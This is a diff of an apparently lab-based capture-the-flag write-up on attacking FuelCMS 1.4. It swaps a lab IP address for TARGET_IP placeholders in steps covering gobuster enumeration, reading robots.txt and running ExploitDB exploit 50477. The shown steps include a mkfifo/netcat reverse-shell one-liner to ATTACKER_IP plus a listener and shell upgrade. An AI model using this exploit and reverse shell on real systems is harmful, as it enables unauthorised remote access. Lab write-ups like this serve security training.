@@ -60,7 +60,7 @@ PORT   STATE SERVICE REASON
 
 Now, time for some directory enumeration/traversal stuff:
 ```shell-session
-$ gobuster dir -t 64 -x txt,xml,php -u http://10.10.53.109/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_dirlist2_3.txt
+$ gobuster dir -t 64 -x txt,xml,php -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_dirlist2_3.txt
 
 $ cat gobuster_dirlist2_3.txt | grep "Status: 200"                        
 /index.php            (Status: 200) [Size: 16595]
@@ -72,7 +72,7 @@ $ cat gobuster_dirlist2_3.txt | grep "Status: 200"
 
 The `robots.txt` file is exposed, let's check what it contains:
 ```txt
-## curl http://10.10.53.109/robots.txt
+## curl http://TARGET_IP/robots.txt
 User-agent: *
 Disallow: /fuel/
 ```
@@ -87,7 +87,7 @@ Checking ExploitDB for some existing exploits for _FuelCMS version 1.4_ shows us
 ## Gaining Access
 
 ```shell-session
-$ python3 50477.py -u http://10.10.53.109/        
+$ python3 50477.py -u http://TARGET_IP/        
 [+]Connecting...
 Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 
@@ -95,7 +95,7 @@ Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444
 # On our machine (in a different session):
 $ nc -nvlp 4444         
 listening on [any] 4444 ...
-connect to [ATTACKER_IP] from (UNKNOWN) [10.10.53.109] 44732
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44732
 sh: 0: can't access tty; job control turned off
 
 $ python -c "import pty; pty.spawn('/bin/bash')"      
